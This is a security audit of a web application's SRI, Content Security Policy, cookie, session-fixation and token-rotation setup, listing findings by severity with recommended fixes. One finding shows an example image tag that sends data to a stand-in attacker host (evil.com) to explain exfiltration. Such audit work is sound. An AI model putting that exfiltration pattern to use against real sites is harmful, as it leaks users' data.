# Lenses 111-115: Security Depth Audit

Audited: 2026-04-18 | Tier: 3 | Lenses: SRI, CSP, Cookie Security, Session Fixation, Token Rotation

---

## Lens 111 — Subresource Integrity (SRI)

### Summary

No SRI `integrity=` attributes are present on any external resource loaded by the application. CDN-hosted resources lack pinning beyond version numbers in URLs.

### External Resources Loaded Without SRI

| Resource | Location | Pinned Version? | integrity= |
|---|---|---|---|
| Google Fonts CSS | `client/index.html` line 28 | No (dynamic API) | **Missing** |
| Swagger UI CSS (`unpkg.com/swagger-ui-dist@5.11.0/swagger-ui.css`) | `server/routes-api-docs.ts` line 33 | Version pinned | **Missing** |
| Swagger UI Bundle JS (`unpkg.com/swagger-ui-dist@5.11.0/swagger-ui-bundle.js`) | `server/routes-api-docs.ts` line 44 | Version pinned | **Missing** |
| Swagger UI Standalone Preset JS (`unpkg.com/swagger-ui-dist@5.11.0/swagger-ui-standalone-preset.js`) | `server/routes-api-docs.ts` line 45 | Version pinned | **Missing** |

### First-Party / Bundled Assets

Vite-built assets in `dist/public/` use content-hash filenames (e.g., `index-CvFpeaQp.js`, `vendor-react-BiCksXNA.js`). These are served from the same origin (`'self'`) and use `crossorigin` attributes on `<link rel="modulepreload">` tags but no `integrity=` hashes. This is acceptable since same-origin assets do not benefit from SRI.

### Third-Party Runtime SDKs (script-src allowlisted)

The CSP `script-src` allows:
- `https://js.stripe.com` — Stripe injects its own scripts at runtime; SRI is not applicable (Stripe controls the content).
- `https://api.mapbox.com` — Mapbox GL JS loaded via npm bundle, not external script tag. No SRI issue.
- `https://*.clerk.accounts.dev` — Clerk SDK scripts loaded dynamically. SRI not applicable.

### Findings

| ID | Severity | Finding |
|---|---|---|
| SRI-01 | **HIGH** | Swagger UI loads 3 resources from `unpkg.com` without `integrity=` attributes. A compromise of unpkg or a MITM on the CDN could inject malicious JavaScript into the API docs page. |
| SRI-02 | **LOW** | Google Fonts CSS loaded without SRI. Google Fonts responses are dynamic (vary by user-agent), making SRI impractical. Acceptable risk. |
| SRI-03 | **INFO** | No other CDN-hosted scripts or stylesheets found. The application bundles all dependencies via Vite, which is the correct approach. |

### Recommendations

1. **SRI-01 fix**: Add `integrity=` and `crossorigin="anonymous"` to the three unpkg.com resources in `server/routes-api-docs.ts`. Generate hashes with `shasum -b -a 384 <file> | awk '{print $1}' | xxd -r -p | base64`. Alternatively, self-host swagger-ui-dist to eliminate the CDN dependency entirely.
2. Consider self-hosting Swagger UI assets from `/assets/swagger/` served by Express static middleware, removing the unpkg.com dependency.

---

## Lens 112 — Content Security Policy (CSP) Strictness

### Configuration Location

`server/middleware/security.ts` lines 10-67

### CSP Header (Production)

```
default-src 'self';
script-src 'self' 'nonce-<random>' https://js.stripe.com https://api.mapbox.com https://*.clerk.accounts.dev https://challenges.cloudflare.com;
style-src 'self' 'unsafe-inline' https://api.mapbox.com https://fonts.googleapis.com;
img-src 'self' data: blob: https: http:;
font-src 'self' data: https://fonts.gstatic.com;
connect-src 'self' https://api.stripe.com https://api.mapbox.com https://events.mapbox.com https://*.clerk.accounts.dev https://*.clerk.dev wss: ws:;
frame-src 'self' https://js.stripe.com https://hooks.stripe.com https://*.clerk.accounts.dev https://challenges.cloudflare.com;
object-src 'none';
base-uri 'self';
form-action 'self';
frame-ancestors 'none';
upgrade-insecure-requests;
report-uri /api/csp-report
```

### CSP Header (Development)

Same as production but adds `'unsafe-eval'` to `script-src` for Vite HMR. This is expected.

### What Is Configured Well

- **Nonce-based script-src**: Per-request 16-byte random nonce generated via `crypto.randomBytes(16)`. Nonce injected into HTML via `static.ts` (`data-csp-nonce` replacement and `buildEnvScriptTag`).
- **No `unsafe-eval` in production**: Only added in development.
- **`object-src 'none'`**: Blocks Flash/Java plugin vectors.
- **`base-uri 'self'`**: Prevents base tag hijacking.
- **`form-action 'self'`**: Prevents form submission to external origins.
- **`frame-ancestors 'none'`**: Equivalent to X-Frame-Options DENY. Both headers are set.
- **Enforcing mode**: CSP is set via `Content-Security-Policy` (not `Content-Security-Policy-Report-Only`).
- **Report endpoint**: `/api/csp-report` is implemented (`server/index.ts` line 399) and logs violations.
- **`upgrade-insecure-requests`**: Only in production.
- **HSTS**: Set with `max-age=31536000; includeSubDomains; preload` in production.
- **Supplementary headers**: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` set.

### Findings

| ID | Severity | Finding |
|---|---|---|
| CSP-01 | **MEDIUM** | `style-src` includes `'unsafe-inline'`. This weakens CSP against CSS injection attacks. Required for Mapbox GL and dynamically injected styles (common in UI libraries), but should be documented as a known trade-off. |
| CSP-02 | **MEDIUM** | `img-src` includes `https: http:`. This is overly broad and allows image loading from any HTTP/HTTPS origin. An attacker could exfiltrate data via image URLs (e.g., `<img src="https://evil.com/track?data=...">`). |
| CSP-03 | **LOW** | `connect-src` includes `wss:` and `ws:` without origin restriction. Any WebSocket origin is permitted. Should be narrowed to `wss://acreos.io wss://*.acreos.io` in production. |
| CSP-04 | **LOW** | `report-uri` is deprecated in CSP Level 3. Modern browsers prefer `report-to` with the `Reporting-Endpoints` header. The `report-uri` directive still works but should be supplemented. |
| CSP-05 | **LOW** | Clerk proxy path (`/__clerk`) skips CSP entirely (line 12). Clerk responses are proxied raw with no security headers injected. If a Clerk response includes HTML, it would lack CSP protection. |
| CSP-06 | **INFO** | The inline `<script>` in `client/index.html` (dark mode FOUC prevention, lines 32-38) does not have `data-csp-nonce` attribute. In production build (`dist/public/index.html`), this script tag is present without a nonce. The CSP nonce injection in `static.ts` only replaces `data-csp-nonce` markers; this script lacks that marker and would be blocked by CSP in production. |
| CSP-07 | **INFO** | Swagger UI HTML page (`/api/docs`) loads external scripts from `unpkg.com` which are not in the `script-src` allowlist. The Swagger UI page would be blocked by CSP unless it bypasses the security middleware. Since it is served from a route handler (not static), the CSP headers from the middleware will apply and block the unpkg scripts. |

### Recommendations

1. **CSP-02**: Restrict `img-src` to known image origins: `'self' data: blob: https://api.mapbox.com https://*.stripe.com https://img.clerk.com`.
2. **CSP-06**: Add `data-csp-nonce` to the dark-mode FOUC script in `client/index.html`, or rewrite it as an external script.
3. **CSP-07**: Add `https://unpkg.com` to `script-src` and `style-src` in the CSP, or better yet, self-host Swagger UI.

---

## Lens 113 — Cookie Security

### Cookies Identified

#### 1. `borrower_session` (set by application code)

**Location**: `server/routes-borrower.ts` line 90-96

```typescript
res.cookie('borrower_session', sessionToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 24 * 60 * 60 * 1000, // 24 hours
  path: '/',
});
```

| Attribute | Value | Assessment |
|---|---|---|
| httpOnly | `true` | Correct |
| secure | `true` in production | Correct |
| sameSite | `strict` | Correct |
| maxAge | 24 hours | Reasonable for borrower portal |
| path | `/` | Could be narrowed to `/api/borrower` |
| domain | Not set (defaults to current host) | Correct |

**Assessment**: Well configured. The session token is generated with `crypto.randomBytes(32).toString('hex')` (64 hex chars of entropy). Sessions are stored server-side with expiry checks. Expired sessions are cleaned up hourly.

#### 2. `csrf_token` (CSRF double-submit cookie)

**Location**: Cookie is referenced in `server/middleware/csrf.ts` line 46 for validation, and in `client/src/components/notes-import-dialog.tsx` line 151 for reading. However, **no server-side code was found that actually sets this cookie**.

| Attribute | Value | Assessment |
|---|---|---|
| httpOnly | **Unknown / Not set** | **PROBLEM**: If readable by JS (line 151 reads it via `document.cookie`), it must NOT be httpOnly. But it also must be set somewhere. |
| secure | **Unknown** | Not set by server code found in audit |
| sameSite | **Unknown** | Not set by server code found in audit |

**Assessment**: **The CSRF cookie is never explicitly set by server code in this codebase.** The `csrfProtection` middleware validates that `req.cookies.csrf_token` matches the `x-csrf-token` header, but no middleware or route sets the `csrf_token` cookie. This means either:
- (a) The cookie is set by Clerk or another upstream middleware not visible in the codebase, or
- (b) The CSRF protection is non-functional because the cookie is never issued, meaning all mutating requests without Bearer auth will fail with 403.

This is a **critical finding** -- either CSRF is silently broken for browser sessions, or there is a hidden cookie-setting mechanism.

#### 3. `__session` (Clerk session JWT)

**Location**: Set by Clerk SDK, consumed in `server/auth/clerkAuth.ts` lines 27-47

This cookie is managed by Clerk, not by application code. The Clerk proxy (`server/routes.ts` line 264-266) rewrites `domain=` in Clerk's `Set-Cookie` headers to `.acreos.io`:

```typescript
if (k === "set-cookie") {
  res.appendHeader(key, value.replace(/domain=[^;]+/gi, "domain=.acreos.io"));
}
```

| Attribute | Value | Assessment |
|---|---|---|
| httpOnly | Set by Clerk (typically `true`) | Assumed correct |
| secure | Set by Clerk (typically `true`) | Assumed correct |
| sameSite | Set by Clerk (typically `lax`) | Assumed correct |
| domain | Rewritten to `.acreos.io` | Broad -- applies to all subdomains |

#### 4. `__client` (Clerk client cookie)

Referenced in `server/routes.ts` line 224 and 275 for cache keying. Set by Clerk.

#### 5. `connect.sid` (Express session cookie)

Referenced in `server/websocket.ts` line 45 for WebSocket auth validation. The WebSocket server validates this cookie against a `"session"` table in PostgreSQL. However, **no express-session middleware setup was found in the codebase** -- `express-session` is not in `package.json` dependencies. This appears to be **dead code** from a prior authentication system (pre-Clerk migration). The WebSocket auth code references `connect-pg-simple` session store patterns but the middleware is not registered.

### Findings

| ID | Severity | Finding |
|---|---|---|
| COOKIE-01 | **CRITICAL** | The `csrf_token` cookie is validated in middleware but never set by any server code. CSRF protection may be non-functional for browser-based sessions. |
| COOKIE-02 | **MEDIUM** | The `connect.sid` cookie is validated in WebSocket auth (`websocket.ts` line 45) but express-session is not installed or configured. WebSocket authentication via session cookie is broken/dead code. |
| COOKIE-03 | **LOW** | `borrower_session` path is `/` but could be narrowed to `/api/borrower` to reduce exposure. |
| COOKIE-04 | **LOW** | Clerk `Set-Cookie` domain rewritten to `.acreos.io` which is valid but means cookies apply to all subdomains. If any subdomain is compromised, session cookies could be read. |
| COOKIE-05 | **INFO** | `borrower_session` cookie is well-configured with httpOnly, secure, sameSite strict, and reasonable maxAge. |

---

## Lens 114 — Session Fixation

### Authentication Flows Analyzed

#### 1. Primary Auth: Clerk (OAuth/Email)

**Flow**: Google OAuth -> Clerk session -> `__session` JWT cookie -> `clerkMiddleware` -> `isAuthenticated` -> `hydrateUser`

Clerk manages session creation externally. The application does not create or manage the `__session` cookie -- it only reads and validates it. Session fixation protection depends entirely on Clerk's implementation. Clerk creates new session tokens after authentication and does not reuse pre-authentication tokens. **This is adequately handled by Clerk.**

#### 2. Borrower Portal Auth

**Flow**: POST `/api/borrower/verify` with `{accessToken, email}` -> server validates -> creates `borrower_session` cookie

**Location**: `server/routes-borrower.ts` lines 47-97

The borrower session is created fresh on every successful verification:

```typescript
const sessionToken = crypto.randomBytes(32).toString('hex');
```

There is **no pre-existing session to fixate** -- the session is created only after successful credential verification. The previous cookie (if any) is not cleared before issuing the new one, but since the token is cryptographically random and server-validated, an attacker cannot predict or pre-set a valid token.

**Assessment**: Not vulnerable to session fixation.

#### 3. 2FA Flow

**Location**: `server/routes-2fa.ts`

The 2FA flow stores `pendingTwoFactorSecret` and `pendingBackupCodes` on `(req as any).session` (lines 51-52). This references an express-session object, but express-session is not installed. This code path is likely broken.

No session regeneration occurs after 2FA verification.

#### 4. WebSocket Authentication

**Location**: `server/websocket.ts` lines 34-73

WebSocket connections validate `connect.sid` against a PostgreSQL `session` table. As noted in Lens 113, this is dead code since express-session is not installed. WebSocket auth is effectively non-functional via this path.

The WebSocket server does have a fallback -- it checks `claimedUserId` passed via the WebSocket URL against the session. But since the session lookup always fails (no sessions in DB), WebSocket connections may be unauthenticated.

### Findings

| ID | Severity | Finding |
|---|---|---|
| FIXATION-01 | **LOW** | Primary auth (Clerk) handles session fixation correctly. Session tokens are created by Clerk after authentication. |
| FIXATION-02 | **LOW** | Borrower portal creates fresh session tokens from crypto random bytes. Not vulnerable. |
| FIXATION-03 | **HIGH** | WebSocket authentication relies on `connect.sid` / express-session which is not installed. WebSocket connections may lack authentication entirely, depending on fallback behavior. |
| FIXATION-04 | **MEDIUM** | 2FA flow references `req.session` (express-session) which is not available. 2FA setup/verify-setup endpoints will throw runtime errors when attempting to write to `req.session`. |

---

## Lens 115 — Token Rotation / Revocation

### JWT Token Handling

#### Clerk `__session` JWT

**Location**: `server/auth/clerkAuth.ts` lines 24-47

- **Expiry**: Clerk JWTs have `exp` claims. The fallback verifier checks `payload.exp * 1000 > Date.now() - GRACE_PERIOD_MS`.
- **Grace period**: 30 seconds past expiry (reduced from 5 minutes, per SEC-005 comment on line 39). This is reasonable for clock skew.
- **Rotation**: Clerk automatically rotates short-lived session JWTs (typically 60-second lifetime). The client SDK refreshes them transparently.
- **Revocation**: Clerk sessions can be revoked via the Clerk dashboard or API. The `clerkMiddleware` validates tokens against Clerk's backend on each request. The JWT fallback path (lines 24-47) does **not** check a revocation list -- it only verifies the signature and expiry.

| ID | Severity | Finding |
|---|---|---|
| TOKEN-01 | **MEDIUM** | The JWT fallback path (`CLERK_JWT_KEY` manual verification) does not check token revocation. If a Clerk session is revoked, the JWT fallback will continue to accept the token until it expires (up to 60s + 30s grace = 90s). This is a known trade-off for offline JWT verification. |

#### Borrower Session Tokens

- **Expiry**: 24 hours, checked on every request in `validateBorrowerSession` (line 27-28).
- **Rotation**: No rotation. The same token is used for the entire 24-hour session.
- **Revocation**: Sessions can be explicitly deleted via `/api/borrower/logout` (line 198-211) or expire naturally. Expired sessions are cleaned hourly (`server/routes.ts` line 187-198).
- **Storage**: Server-side in database. Token is a 256-bit cryptographic random value.

| ID | Severity | Finding |
|---|---|---|
| TOKEN-02 | **LOW** | Borrower session tokens are not rotated during the 24-hour lifetime. For a public-facing borrower portal, consider rotating the token on each use (sliding window) to limit the exposure window of a stolen token. |

#### Organization API Keys

**Location**: `server/routes-admin.ts` lines 3932-3996

- **Revocation**: API keys can be revoked via `DELETE /api/org/api-keys/:id` which sets `isRevoked: true`.
- **Validation**: Keys are filtered by `isRevoked: false` on lookup (line 3936).
- **Assessment**: Properly implemented.

#### Delegation Tokens (SCP Agent System)

**Location**: `server/services/delegationTokensV11.ts`

- **Expiry**: Each token has an `expiresAt` timestamp checked on use.
- **Auto-revocation**: Tokens are auto-revoked if failure rate exceeds 40% (line 16).
- **Manual revocation**: `revoke()` method sets `revoked: true, status: "revoked"` (lines 118-125).
- **Standing delegations**: Auto-renewable tokens with `autoRenewDays`.
- **Assessment**: Well-designed revocation model for the agent delegation use case.

#### Refresh Token Handling

**There is no refresh token mechanism in the application code.** Clerk handles session refresh transparently via its SDK. The application does not implement its own refresh token flow.

| ID | Severity | Finding |
|---|---|---|
| TOKEN-03 | **INFO** | No custom refresh token implementation exists. This is correct given the Clerk-managed auth architecture. Clerk's SDK handles session refresh automatically. |

#### Token Blacklist / Allowlist

There is no application-level JWT blacklist or allowlist. This is expected because:
1. Primary auth is via Clerk's `clerkMiddleware` which validates against Clerk's backend (online validation).
2. The JWT fallback is a degraded-mode path only used when `clerkMiddleware` fails.

| ID | Severity | Finding |
|---|---|---|
| TOKEN-04 | **LOW** | No JWT blacklist exists for the fallback verification path. If an attacker obtains a valid JWT and the Clerk backend is unreachable (triggering fallback mode), the token cannot be revoked until it expires. The 90-second max window (60s JWT + 30s grace) limits the impact. |

---

## Consolidated Findings Summary

| ID | Lens | Severity | Finding |
|---|---|---|---|
| COOKIE-01 | 113 | **CRITICAL** | CSRF cookie `csrf_token` is validated but never set. CSRF protection may be non-functional. |
| SRI-01 | 111 | **HIGH** | Swagger UI loads 3 external scripts/styles from unpkg.com without `integrity=` attributes. |
| FIXATION-03 | 114 | **HIGH** | WebSocket auth relies on express-session (`connect.sid`) which is not installed. WS connections may be unauthenticated. |
| CSP-01 | 112 | **MEDIUM** | `style-src 'unsafe-inline'` weakens CSP. |
| CSP-02 | 112 | **MEDIUM** | `img-src https: http:` is overly permissive. |
| COOKIE-02 | 113 | **MEDIUM** | `connect.sid` session validation in WebSocket is dead code (no express-session). |
| FIXATION-04 | 114 | **MEDIUM** | 2FA setup writes to `req.session` which does not exist (express-session not installed). |
| TOKEN-01 | 115 | **MEDIUM** | JWT fallback path does not check revocation list. |
| CSP-03 | 112 | **LOW** | `connect-src wss: ws:` allows any WebSocket origin. |
| CSP-04 | 112 | **LOW** | Uses deprecated `report-uri` instead of `report-to`. |
| CSP-05 | 112 | **LOW** | Clerk proxy path bypasses CSP entirely. |
| COOKIE-03 | 113 | **LOW** | `borrower_session` path could be narrowed from `/` to `/api/borrower`. |
| COOKIE-04 | 113 | **LOW** | Clerk cookie domain `.acreos.io` applies to all subdomains. |
| TOKEN-02 | 115 | **LOW** | Borrower tokens not rotated during 24h lifetime. |
| TOKEN-04 | 115 | **LOW** | No JWT blacklist for fallback verification path. |
| SRI-02 | 111 | **LOW** | Google Fonts loaded without SRI (impractical to fix). |
| CSP-06 | 112 | **INFO** | Dark mode FOUC script lacks nonce marker; may be blocked by CSP in production. |
| CSP-07 | 112 | **INFO** | Swagger UI external scripts blocked by CSP (not in script-src allowlist). |
| SRI-03 | 111 | **INFO** | All other dependencies bundled via Vite (correct approach). |
| FIXATION-01 | 114 | **INFO** | Clerk auth handles session fixation correctly. |
| FIXATION-02 | 114 | **INFO** | Borrower portal session creation is fixation-safe. |
| COOKIE-05 | 113 | **INFO** | Borrower session cookie attributes well configured. |
| TOKEN-03 | 115 | **INFO** | No custom refresh tokens needed (Clerk manages). |
